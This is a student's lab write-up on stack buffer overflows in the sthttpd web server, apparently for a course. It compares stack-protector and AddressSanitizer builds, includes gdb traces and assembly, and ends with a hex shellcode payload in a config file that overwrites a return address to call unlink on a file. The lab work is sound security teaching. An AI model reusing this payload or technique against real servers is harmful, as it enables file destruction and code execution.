@@ -1,0 +1,700 @@
+Well-written answers (to some extent):
+
+
+1. How to make the SP crash?
+write a /src/foo.txt with
+debug debug debug ..... debug
+(133 of them (798))
+Can't write too many debugs cz only 1000 chars will be copied so
+if you write more than 1000 chars it'll be cut off
+and the multithreadedness will cause the 'deb' at the end
+to be processed and read as an invalid command and thus
+exit because of that before it detects and acts on
+the stack overflow
+
+go to /src then 
+gdb thttpd-sp
+r -p 12409 -D -C foo.txt
+
+
+2. Identify the machine instruction causing crash
+
+=> 0x0000000000404d9f <read_config+1215>:       c3      retq
+(gdb)
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+
+
+
+3. Explain why.
+Returns to invalid address because the return address has been
+overwritten by 0x7562656400677562 'bug\0debug'
+Thus the SIGSEGV
+
+*************** 1,2,3 star (with a different config file) ****************
+1star.
+Stack smashing with my machine code file hex2rawout.txt (explained later)
+generates a different error
+*** stack smashing detected ***: /w/home.15/cs/ugrad/xian/Desktop/sthttpd-2.27.0/src/thttpd-sp terminated
+======= Backtrace: =========
+/lib64/libc.so.6(__fortify_fail+0x37)[0x7ffff76ec047]
+/lib64/libc.so.6(__fortify_fail+0x0)[0x7ffff76ec010]
+/w/home.15/cs/ugrad/xian/Desktop/sthttpd-2.27.0/src/thttpd-sp[0x405056]
+[0x7fffffffcf98]
+======= Memory map: ========
+00400000-00415000 r-xp 00000000 00:2b 4132546                            /w/home.15/cs/ugrad/xian/Desktop/sthttpd-2.27.0/src/thttpd-sp
+00614000-00615000 r--p 00014000 00:2b 4132546                            /w/home.15/cs/ugrad/xian/Desktop/sthttpd-2.27.0/src/thttpd-sp
+00615000-00617000 rw-p 00015000 00:2b 4132546                            /w/home.15/cs/ugrad/xian/Desktop/sthttpd-2.27.0/src/thttpd-sp
+00617000-00639000 rw-p 00000000 00:00 0                                  [heap]
+7ffff6da4000-7ffff6db9000 r-xp 00000000 08:07 277389                     /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+7ffff6db9000-7ffff6fb8000 ---p 00015000 08:07 277389                     /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+7ffff6fb8000-7ffff6fb9000 r--p 00014000 08:07 277389                     /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+7ffff6fb9000-7ffff6fba000 rw-p 00015000 08:07 277389                     /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+7ffff6fba000-7ffff6fbc000 r-xp 00000000 08:07 261558                     /usr/lib64/libdl-2.17.so
+7ffff6fbc000-7ffff71bc000 ---p 00002000 08:07 261558                     /usr/lib64/libdl-2.17.so
+7ffff71bc000-7ffff71bd000 r--p 00002000 08:07 261558                     /usr/lib64/libdl-2.17.so
+7ffff71bd000-7ffff71be000 rw-p 00003000 08:07 261558                     /usr/lib64/libdl-2.17.so
+7ffff71be000-7ffff71c0000 r-xp 00000000 08:07 261158                     /usr/lib64/libfreebl3.so
+7ffff71c0000-7ffff73bf000 ---p 00002000 08:07 261158                     /usr/lib64/libfreebl3.so
+7ffff73bf000-7ffff73c0000 r--p 00001000 08:07 261158                     /usr/lib64/libfreebl3.so
+7ffff73c0000-7ffff73c1000 rw-p 00002000 08:07 261158                     /usr/lib64/libfreebl3.so
+7ffff73c1000-7ffff73d8000 r-xp 00000000 08:07 261794                     /usr/lib64/libpthread-2.17.so
+7ffff73d8000-7ffff75d7000 ---p 00017000 08:07 261794                     /usr/lib64/libpthread-2.17.so
+7ffff75d7000-7ffff75d8000 r--p 00016000 08:07 261794                     /usr/lib64/libpthread-2.17.so
+7ffff75d8000-7ffff75d9000 rw-p 00017000 08:07 261794                     /usr/lib64/libpthread-2.17.so
+7ffff75d9000-7ffff75dd000 rw-p 00000000 00:00 0
+7ffff75dd000-7ffff7793000 r-xp 00000000 08:07 261482                     /usr/lib64/libc-2.17.so
+7ffff7793000-7ffff7993000 ---p 001b6000 08:07 261482                     /usr/lib64/libc-2.17.so
+7ffff7993000-7ffff7997000 r--p 001b6000 08:07 261482                     /usr/lib64/libc-2.17.so
+7ffff7997000-7ffff7999000 rw-p 001ba000 08:07 261482                     /usr/lib64/libc-2.17.so
+7ffff7999000-7ffff799e000 rw-p 00000000 00:00 0
+7ffff799e000-7ffff79a6000 r-xp 00000000 08:07 261555                     /usr/lib64/libcrypt-2.17.so
+7ffff79a6000-7ffff7ba5000 ---p 00008000 08:07 261555                     /usr/lib64/libcrypt-2.17.so
+7ffff7ba5000-7ffff7ba6000 r--p 00007000 08:07 261555                     /usr/lib64/libcrypt-2.17.so
+7ffff7ba6000-7ffff7ba7000 rw-p 00008000 08:07 261555                     /usr/lib64/libcrypt-2.17.so
+7ffff7ba7000-7ffff7bd5000 rw-p 00000000 00:00 0
+7ffff7bd5000-7ffff7bdc000 r-xp 00000000 08:07 261885                     /usr/lib64/librt-2.17.so
+7ffff7bdc000-7ffff7ddb000 ---p 00007000 08:07 261885                     /usr/lib64/librt-2.17.so
+7ffff7ddb000-7ffff7ddc000 r--p 00006000 08:07 261885                     /usr/lib64/librt-2.17.so
+7ffff7ddc000-7ffff7ddd000 rw-p 00007000 08:07 261885                     /usr/lib64/librt-2.17.so
+7ffff7ddd000-7ffff7dfd000 r-xp 00000000 08:07 261138                     /usr/lib64/ld-2.17.so
+7ffff7fcd000-7ffff7fd2000 rw-p 00000000 00:00 0
+7ffff7ff8000-7ffff7ffa000 rw-p 00000000 00:00 0
+7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
+7ffff7ffc000-7ffff7ffd000 r--p 0001f000 08:07 261138                     /usr/lib64/ld-2.17.so
+7ffff7ffd000-7ffff7ffe000 rw-p 00020000 08:07 261138                     /usr/lib64/ld-2.17.so
+7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0
+7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+
+Program received signal SIGABRT, Aborted.
+0x00007ffff76121d7 in raise () from /lib64/libc.so.6
+
+2star.
+   0x0000000000404f43 <read_config+1251>:       c3      retq
+(gdb)
+1191        }
+=> 0x0000000000405051 <read_config+1521>:       e8 5a d4 ff ff  callq  0x4024b0 <__stack_chk_fail@plt>
+
+3star.
+the retq accesses invalid memory for instructions; 
+the return address overwritten to point to my code
+which is on the stack, and you can't execute stuff on the stack
+with the strong protector (or by default)
+so __stack_chk_fail is called
+
+
+4. How to make AS crash?
+write a /src/foo.txt with
+debug debug debug ..... debug
+(133 of them (798))
+
+go to /src then 
+gdb thttpd-as
+r -p 12410 -D -C foo.txt
+
+
+5. Identify the machine instruction causing crash
+ 0x00000000004e0b4c <read_config+188>:        e8 2f a5 f5 ff  callq  0x43b080 <__interceptor_strchr(char const*, int)>
+is called after a je which finds that the stack has been corrupted
+(it calls the  interceptor  which is part of the address sanitizer )
+
+
+==9692==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffce94 at pc 0x00000043aec9 bp 0x7fffffffcdf0 sp 0x7fffffffc5a0
+READ of size 811 at 0x7fffffffce94 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+=> 0x00007ffff7075118:  80 39 48        cmpb   $0x48,(%rcx)
+
+^actual command that accesses the invalid address and causes the segfault
+
+
+6. Explain why.
+cmpb  $0x48, (%rcx)
+tries to access 0x6564206775626564
+(address overwritten by the debugs)
+which is an invalid address, thus SIGSEGV
+
+the error messages are written by the interceptor and other asan library functions
+
+
+7. How to make NO crash?
+make a file called /src/hex2rawout.txt (output from a hex to raw data program)
+dir=g!d"bug!d3bug!dDbug!UH‰åH¿²Ïÿÿÿ  è    ¸W   ]Ãtarget.txt ug!d bug!dbug!d"bug!3bug!dDbug!dUbug!dfwbug!dˆbug!d™bug!d `d<÷ÿ  g!d"bugug!dDbug!dUbug!df˜Ïÿÿÿ  
+(data from hex2rawout.txt file which is also submitted)
+
+go to /src then 
+gdb thttpd-no
+r -p 12411 -D -C hex2rawout.txt
+
+
+
+8. Identify the machine instruction causing the crash
+0x00007ffff76c7350 in unlink () from /lib64/libc.so.6
+=> 0x00007ffff76c7350 <unlink+32>:      c3      retq
+(gdb)
+0x000000000000000a in ?? ()
+=> 0x000000000000000a:  Cannot access memory at address 0xa
+
+
+
+
+9. Explain why
+I made machine code to call the unlink command, but since I didn't put a 
+proper return address, it'll return to whatever happened to be
+in the place in memory that it expects a return address to be
+which happens to be 0x000000000000000a
+
+
+
+
+10. Describe the techniques used by -fstack-protector-strong and -fsanitize=address 
+to prevent buffer-overun exploits in handle_read
+
+went on textdiff.com to check strongprotect vs no protect
+and found no difference in the handle_read function,
+except that jumps and .L numbers were +10 in the no protect file
+However, other functions had canaries from  %fs:40  in the 
+strong protect version. 
+
+near start of function
+...
+movq	%fs:40, %rax
+movq	%rax, 24(%rsp)
+...
+rest of function
+...
+movq	24(%rsp), %rax
+xorq	%fs:40, %rax
+jne	.L60
+
+.L60:
+call	__stack_chk_fail
+
+canary checking by xorq&jne 
+%fs:40 and the value on stack: 24(%rsp)
+
+I looked at the different .Ls that strong protect jumps to, but
+they all didn't have the canary check (I looked for %fs:40)
+However, the caller of handle_read, the main function,
+has the canary checks
+
+Address Sanitize version has a bunch of  
+call __asan_report[load or store][number]
+and 	call	__asan_handle_no_return
+
+and handle_read has many  	
+	cmpb	$0, 2147450880(%r15)
+	jne	.L1176
+
+	.L1176:
+	movq	%r13, %rdi
+	call	__asan_report_load8
+
+which checks that a certain byte on the stack is zero
+if it's not, it calls the asan library functions
+that handles the buffer overflow errors and outputs the messages
+
+AS version has many more lines the SP version (9687 vs 4388) 
+(592 vs 297 for handle_read)
+NO is shortest, with 4348 lines
+The doubled length of AS is due to it adding a cmpb command after almost
+every time %rdx or %rax is changed.
+SP isn't that long since only ~10 lines of putting canary on stack and
+checking every few hundred lines 
+(there are only 51 instances of %fs:40 vs 299 cmpbs and 541 __asans)
+
+//via Piazza
+Due to performance constraints, some functions aren't protected under -fstack-protector-strong 
+if they don't contain certain "triggers". Full details at GNU. 
+-fstack-protector-all would have every function use the canary
+handle_read doesn't employ the canary in the -sp version
+
+
+11. How is your exploit built 
+
+
+make a file called /src/hex2rawout.txt (output from a hex to raw data program)
+machine commands to put (in hex2rawout.txt):
+
+//dir={random stuff} 
+//makes it so that the parser in read_config doesn't complain about config syntax errors
+64 69 72 3d 67 21 64 22 62 75 67 21 64 33 62 75 67 21 64 44 62 75 67 21 
+//code: push %rbp; mov %rsp,%rbp; movabsq $0x7fffffffcfb2,%rdi; 
+//callq 0x7fffffffcfab (probably uneccessary); 
+//mov $0x57 (for syscall but, I'm using unlink@got.plt for this specific code);
+//pop %rbp (also useless), retq (to 0x00007ffff73c6460 (unlink@got.plt))
+//got 0x00007ffff73c6460 from info func unlink
+55 48 89 e5 48 bf b2 cf ff ff ff 7f 00 00 e8 00 00 00 00 b8 57 00 00 00 5d c3
+//more useless stuff (could consolidate useless 
+//stuff and turn into no op sled for non intra-gdb exploit)
+74 61 72 67 65 74 2e 74 78 74 00
+75 67 21 64 00 62 75 67 21 64 11 62 75 67 21 64 22 62 75 67 21 
+33 62 75 67 21 64 44 62 75 67 21 64 55 62 75 67 21 64 66 
+77 62 75 67 21 64 88 62 75 67 21 64 99 62 75 67 21 64 00 
+60 64 3c f7 ff 7f 00 00  //unlink@got.plt; 
+						//overwrites return address for parse_args 
+						//that calls read_config
+//useless stuff
+67 21 64 22 62 75 67 75 67 21 64 44 62 75 67 21 64 55 62 75 67 21 64 66 
+//return address for read_config
+98 cf ff ff ff 7f 00 00 
+
+in ASCII it is
+
+dir=g!d"bug!d3bug!dDbug!UH‰åH¿²Ïÿÿÿ  è    ¸W   ]Ãtarget.txt ug!d bug!dbug!d"bug!3bug!dDbug!dUbug!dfwbug!dˆbug!d™bug!d `d<÷ÿ  g!d"bugug!dDbug!dUbug!df˜Ïÿÿÿ  
+^those are the actual bytes of commands
+
+do
+gdb thttpd-no
+r -p 12411 -D -C hex2rawout.txt
+
+more detail about my adventure is below at line ~600
+
+
+
+
+
+
+Rough notes:
+
+
+r -p 12409 -D
+	  ^port from some hash function prof gave
+
+made compile.sh script file
+
+#!/bin/sh
+
+./configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd src/thttpd-as
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+
+used 2nd ssh session to check server with curl
+
+need -static-libasan for the program to not complain about 
+
+read_config gave error 
+  else
+		{
+		(void) fprintf(
+		    stderr, "%s: unknown config option '%s'\n", argv0, name );
+		exit( 1 );
+		}
+
+
+r -p 12409 -D -C foo.txt
+
+wrote file with debug debug debug .... debug a lot of times
+-> foo.txt
+
+
+
+
+
+Strong Protect
+
+break fgets (since fgets puts the string into the buffer line)
+looked at stack after fgets to check if stack is indeed 
+debug debug debug ... debug
+which it is!
+use 
+x/g $rsp
+0x7fffffffcf80: 0x6564206775626564
+hex values  65  64  20  67  75  62  65  64
+are ascii:  'e' 'd' ' ' 'g' 'u' 'b' 'e' 'd'
+
+last byte with char from 'debug' 
+
+0x7fffffffd366: 0x0000000000000062
+0x7fffffffd363: 0x0000000062656420 (bytes before ...366 have the 'debug' pattern)
+
+/w/home.15/cs/ugrad/xian/Desktop/sthttpd-2.27.0/src/thttpd-sp: unknown config option 'deb'
+
+Compiler limited number of 'debug ' characters that could go on the stack
+Error caused by read_config function not being able to read 'deb' 
+('deb' is not a valid config option), caused by strong protection
+cutting foo.txt file short (my actual file ends with a full 'debug')
+when putting the chars on the stack
+
+
+used make to create .o files as well
+objdump -d thttpd.o > thttpd-sp.txt
+to get assembly
+
+couldn't find handle_read from objdump output
+also couldn't compile directly using gcc -S blabla without make command
+was giving error saying "config.h" not found, 
+so I changed #include <foo.h> lines
+into #include "foo.h" for the .h files inside the directory
+
+then could compile with gcc -S without make
+
+set disassemble-next-line on
+r -p 12409 -D -C foo.txt
+gdb trace with break at read_config 
+stepped until read_config + 866
+and then fin command yields
+Warning:
+Cannot insert breakpoint 0.
+Cannot access memory at address 0x7562656420677562
+
+0x7562656420677562 == b u g   d e b u (read backwards cz little endian)
+so I overwrote the return address
+but stack protection!
+and then stepped twice and it gave me   Segmentation fault    !!! YAY :D
+
+if i do continue instead of step it doesnt give seg fault
+
+note: can't write too many debugs cz multithread 
+Program cuts-off 'debug' at the end into 'deb' and the program reads the invalid 
+'deb' string and exits before it knows there's a segmentation fault
+so config file must be clean of invalid strings
+I rewrote foo.txt to 'debug '*(enough times to reach ~800 chars)
+
+
+
+strong protect error from
+#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000405056 in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x7562656400677562 in ?? ()
+#8  0x0067756265640067 in ?? ()
+#9  0x6564006775626564 in ?? ()
+#10 0x7562656400677562 in ?? ()
+#11 0x0067756265640067 in ?? ()
+#12 0x6564006775626564 in ?? ()
+#13 0x7562656400677562 in ?? ()
+#14 0x0067756265640067 in ?? ()
+#15 0x6564006775626564 in ?? ()
+#16 0x7562656400677562 in ?? ()
+#17 0x0067756265640067 in ?? ()
+#18 0x6564006775626564 in ?? ()
+#19 0x7562656400677562 in ?? ()
+#20 0x0067756265640067 in ?? ()
+#21 0x6400006775626564 in ?? ()
+#22 0x6265640067756265 in ?? ()
+#23 0x6775626564006775 in ?? ()
+#24 0x6400677562656400 in ?? ()
+#25 0x6265640067756265 in ?? ()
+#26 0x6775626564006775 in ?? ()
+#27 0x6400677562656400 in ?? ()
+#28 0x6265640067756265 in ?? ()
+#29 0x6775626564006775 in ?? ()
+#30 0x6400677562656400 in ?? ()
+#31 0x6265640067756265 in ?? ()
+#32 0x6775626564006775 in ?? ()
+#33 0x6400677562656400 in ?? ()
+#34 0x6265640067756265 in ?? ()
+#35 0x6775626564006775 in ?? ()
+#36 0x6400677562656400 in ?? ()
+#37 0x6265640067756265 in ?? ()
+#38 read_config in ?? ()
+
+the return in read_config caused the crash because return address was overwritten and 
+it returned to 0x6265640067756265 which later returned to  0x6400677562656400 
+.... until a disallowed memory location was accessed which caused the calling of
+__stack_check_fail() which thus gives a segmentation fault error
+
+
+
+
+for no
+#0  0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+#1  0x7562656400677562 in ?? ()
+#2  0x0067756265640067 in ?? ()
+#3  0x6564006775626564 in ?? ()
+#4  0x7562656400677562 in ?? ()
+#5  0x0067756265640067 in ?? ()
+#6  0x6564006775626564 in ?? ()
+#7  0x7562656400677562 in ?? ()
+#8  0x0067756265640067 in ?? ()
+#9  0x6564006775626564 in ?? ()
+#10 0x7562656400677562 in ?? ()
+#11 0x0067756265640067 in ?? ()
+#12 0x6564006775626564 in ?? ()
+#13 0x7562656400677562 in ?? ()
+#14 0x0067756265640067 in ?? ()
+#15 0x6400006775626564 in ?? ()
+#16 0x6265640067756265 in ?? ()
+#17 0x6775626564006775 in ?? ()
+#18 0x6400677562656400 in ?? ()
+#19 0x6265640067756265 in ?? ()
+#20 0x6775626564006775 in ?? ()
+#21 0x6400677562656400 in ?? ()
+#22 0x6265640067756265 in ?? ()
+#23 0x6775626564006775 in ?? ()
+#24 0x6400677562656400 in ?? ()
+#25 0x6265640067756265 in ?? ()
+#26 0x6775626564006775 in ?? ()
+#27 0x6400677562656400 in ?? ()
+#28 0x6265640067756265 in ?? ()
+#29 0x6775626564006775 in ?? ()
+#30 0x6400677562656400 in ?? ()
+#31 0x6265640067756265 in ?? ()
+#32 0x6775626564006775 in ?? ()
+#33 0x6400677562656400 in ?? ()
+#34 0x6265640067756265 in ?? ()
+#35 0x6775626564006775 in ?? ()
+#36 0x6400677562656400 in ?? ()
+#37 0x6265640067756265 in ?? ()
+#38 0x6775626564006775 in ?? ()
+
+for no protection 
+the return in read_config caused the crash because return address was overwritten and 
+it returned to 0x6775626564006775 which later returned to  0x6265640067756265 
+.... until a disallowed memory location was accessed which caused a 
+segmentation fault error 
+
+
+
+
+address sanitizer 
+
+==18672==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffce84 at pc 0x00000043aec9 bp 0x7fffffffcde0 sp 0x7fffffffc590
+READ of size 811 at 0x7fffffffce84 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+(gdb) bt
+#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (this=0x7fffffffbd00, pc=4435657,
+    max_depth=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
+#3  0x00000000004b42e1 in __asan::GetStackTraceWithPcBpAndContext (fast=false, context=0x0, bp=140737488342496,
+    pc=4435657, max_depth=256, stack=0x7fffffffbd00) at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
+#4  __asan::ReportGenericError (pc=<optimized out>, bp=bp@entry=140737488342496, sp=sp@entry=140737488340368,
+    addr=addr@entry=140737488342660, is_write=is_write@entry=false, access_size=access_size@entry=811,
+    exp=<optimized out>, fatal=<optimized out>) at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
+#5  0x000000000043aee4 in __interceptor_strchr (str=<optimized out>, c=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+#6  0x00000000004e0b51 in read_config (filename=<optimized out>) at thttpd.c:1018
+#7  0x6564206775626564 in ?? ()
+#8  0x7562656420677562 in ?? ()
+#9  0x2067756265642067 in ?? ()
+#10 0x6564206775626564 in ?? ()
+#11 0x7562656420677562 in ?? ()
+#12 0x2067756265642067 in ?? ()
+#13 0x6420206775626564 in ?? ()
+#14 0x6265642067756265 in ?? ()
+#15 0x6775626564206775 in ?? ()
+#16 0x6420677562656420 in ?? ()
+#17 0x6265642067756265 in ?? ()
+#18 0x6775626564206775 in ?? ()
+#19 0x6420677562656420 in ?? ()
+#20 0x6265642067756265 in ?? ()
+#21 0x6775626564206775 in ?? ()
+#22 0x6420677562656420 in ?? ()
+#23 0x6265642067756265 in ?? ()
+#24 0x6775626564206775 in ?? ()
+#25 0x6420677562656420 in ?? ()
+#26 0x6265642067756265 in ?? ()
+#27 0x6775626564206775 in ?? ()
+#28 0x6420677562656420 in ?? ()
+#29 0x6265642067756265 in ?? ()
+#30 0x6775626564206775 in ?? ()
+#31 0x6420677562656420 in ?? ()
+#32 0x6265642067756265 in ?? ()
+
+address sanitizer found the seg fault caused by same reason as other ones
+but it calls __interceptor_strchr() which is part of address sanitizer which 
+calls stuff that outputs the segmentation fault error but also some extra
+helpful error messages:
+==18672==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffce84 at pc 0x00000043aec9 bp 0x7fffffffcde0 sp 0x7fffffffc590
+READ of size 811 at 0x7fffffffce84 thread T0
+
+__asan_option_detect_stack_use_after_return(%rip)
+is also used in read_config in the AS version. 
+
+note that the ?? call stack is due to the return address being overwritten by debug debug ... 
+so gdb thinks the caller was 0x6265.... (debug...)
+
+
+went on textdiff.com to check strongprotect vs no protect
+and found no difference in the handle_read function,
+except that jumps and .L numbers were +10 in the no protect file
+However, other functions had canaries from  %fs:40  in the 
+strong protect version. 
+
+near start of function
+...
+movq	%fs:40, %rax
+movq	%rax, 24(%rsp)
+...
+rest of function
+...
+movq	24(%rsp), %rax
+xorq	%fs:40, %rax
+jne	.L60
+
+.L60:
+call	__stack_chk_fail
+
+canary checking by xorq&jne 
+%fs:40 and the value on stack: 24(%rsp)
+
+I looked at the different .Ls that strong protect jumps to, but
+they all didn't have the canary check (I looked for %fs:40)
+However, the caller of handle_read, the main function,
+has the canary checks
+
+Address Sanitize version has a bunch of  
+call __asan_report[load or store][number]
+and 	call	__asan_handle_no_return
+
+and handle_read has many  	
+	cmpb	$0, 2147450880(%r15)
+	jne	.L1176
+
+	.L1176:
+	movq	%r13, %rdi
+	call	__asan_report_load8
+
+which checks that a certain byte on the stack is zero
+if it's not, it calls the asan library functions
+that handles the buffer overflow errors and outputs the messages
+
+AS version has many more lines the SP version (9687 vs 4388)
+NO is shortest, with 4348 lines
+The doubled length of AS is due to it adding a cmpb command after almost
+every time %rdx or %rax is changed.
+SP isn't that long since only ~10 lines of putting canary on stack and
+checking every few hundred lines 
+(there are only 51 instances of %fs:40 vs 299 cmpbs and 541 __asans)
+
+
+
+
+
+
+
+HOW TO EXPLOIT 101 (MY ADVENTURE TIME DESU)
+
+found mem address with return address using a short config file
+with a single "debug" and stepping (using nexti) thru the read_config
+until right before ret command
+then using x/40xw $rsp
+what read_config returns to
+0x7fffffffd018: 0x004051df      0x00000000    
+or: 0x00000000004051df
+
+after injecting buffer overflow
+0x7fffffffd018: 0x20677562      0x75626564 
+or 0x7562656420677562
+hence the
+Warning:
+Cannot insert breakpoint 0.
+Cannot access memory at address 0x7562656420677562
+after doing  fin  command inside read_config's frame
+
+$rsp in read_config in body of function (from info reg rsp)
+(also where line buffer starts)
+0x7fffffffcf80
+
+0x7fffffffd018 - 0x7fffffffcf80 = 0x98 = 152
+return address starts after 152 chars or 25.333 'debug '
+
+let's start the injected code at
+0x7fffffffd020 right after return address
+
+but wait there are stuffies put on stack when fclose is called 
+  					   							0x0000000a      0x00000000
+0x7fffffffd028: 0xffffe5ad      0x00007fff      0xffffd110      0x00007fff
+0x7fffffffd038: 0xffffd090      0x00007fff      0xffffe2b0      0x00007fff
+0x7fffffffd048: 0x00000000      0x00000000      0x00000000      0x00000000
+0x7fffffffd058: 0x00403743      0x00000000 
+
+0a 00 00 00 00 00 00 00
+ad e5 ff ff ff 7f 00 00
+10 d1 ff ff ff 7f 00 00
+90 d0 ff ff ff 7f 00 00
+b0 e2 ff ff ff 7f 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+43 37 40 00 00 00 00 00
+
+
+
+we must instead start code at
+0x7fffffffd060 and preserve the stuffies fclose puts
+but then there are things in 0x00007fffffffd110 and 0x...090 
+that apparently we aren't supposed to mess with 
+so let's start at 0x7fffffffd128
+
+eh those don't work either
+so let's write machine commands before the return address!
+
+removed exit(1) btw
+but trying to do dir= instead of debug debug may work without 
+removing the exit call for invalid strings
+and it worked (made sure to remove the spaces though)!
+
+
+machine commands to put (in hex2rawout.txt):
+
+//dir={random stuff}
+64 69 72 3d 67 21 64 22 62 75 67 21 64 33 62 75 67 21 64 44 62 75 67 21 
+//code: push %rbp; mov %rsp,%rbp; movabsq $0x7fffffffcfb2,%rdi; 
+//callq 0x7fffffffcfab (probably uneccessary); 
+//mov $0x57 (for syscall but, I'm using unlink@got.plt for this specific code);
+//pop %rbp (also useless), retq (to 0x00007ffff73c6460 (unlink@got.plt))
+//got 0x00007ffff73c6460 from info func unlink
+55 48 89 e5 48 bf b2 cf ff ff ff 7f 00 00 e8 00 00 00 00 b8 57 00 00 00 5d c3
+//more useless stuff (could consolidate useless 
+//stuff and turn into no op sled for non intra-gdb exploit)
+74 61 72 67 65 74 2e 74 78 74 00
+75 67 21 64 00 62 75 67 21 64 11 62 75 67 21 64 22 62 75 67 21 
+33 62 75 67 21 64 44 62 75 67 21 64 55 62 75 67 21 64 66 
+77 62 75 67 21 64 88 62 75 67 21 64 99 62 75 67 21 64 00 
+60 64 3c f7 ff 7f 00 00  //unlink@got.plt; 
+						//overwrites return address for parse_args 
+						//that calls read_config
+//useless stuff
+67 21 64 22 62 75 67 75 67 21 64 44 62 75 67 21 64 55 62 75 67 21 64 66 
+//return address for read_config
+98 cf ff ff ff 7f 00 00 
+
+
+my exploits didn't work at first because I was trying to find the
+remove function which wasn't linked to the thttpd executable
+So then, I tried to call remove function into c code
+and then find it on the @plt and it worked when I called it
+but then Office Hours friends and piazza pointed me to the
+unlink 
+function which was linked to thttpd-no
+so I called unlink instead (it worked! yayayay)
